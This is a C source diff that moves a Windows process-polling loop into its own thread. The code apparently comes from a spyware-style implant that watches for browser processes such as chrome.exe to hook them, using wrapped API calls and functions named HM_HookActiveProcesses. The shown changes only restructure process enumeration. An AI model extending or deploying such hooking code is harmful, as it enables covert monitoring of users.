@@ -2156,9 +2156,8 @@ BOOL HM_HookActiveProcesses()
 #define PROCESS_POLLED 6
 #define PROCESS_FREQUENTLY_POLLED 4
 
-void HM_StartPolling(void)
+DWORD WINAPI PollNewApps(DWORD dummy)
 {
-	MSG msg;
 	char *polled_name[PROCESS_POLLED];
 	DWORD i, loop_count = 0;
 	HANDLE hProcessSnap;
@@ -2174,11 +2173,8 @@ void HM_StartPolling(void)
 	polled_name[5] = "chrome.exe";
 
 	LOOP {
+		Sleep(HM_PTSLEEPTIME);
 		loop_count++;
-
-		// Usato solo per monitorare il messaggio di QUIT
-		// quando viene effettuato il logoff
-		HANDLE_SENT_MESSAGES(msg, HM_PTSLEEPTIME);
 
 		pe32.dwSize = sizeof( PROCESSENTRY32 );
 		if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE ) 
@@ -2228,6 +2224,17 @@ void HM_StartPolling(void)
 			}
 		} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
 		CloseHandle( hProcessSnap );
+	}
+}
+
+void HM_StartPolling(void)
+{
+	DWORD dummy;
+	MSG msg;
+
+	HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PollNewApps, NULL, 0, &dummy);
+	LOOP {
+		HANDLE_SENT_MESSAGES(msg, 100);
 	}
 }
 
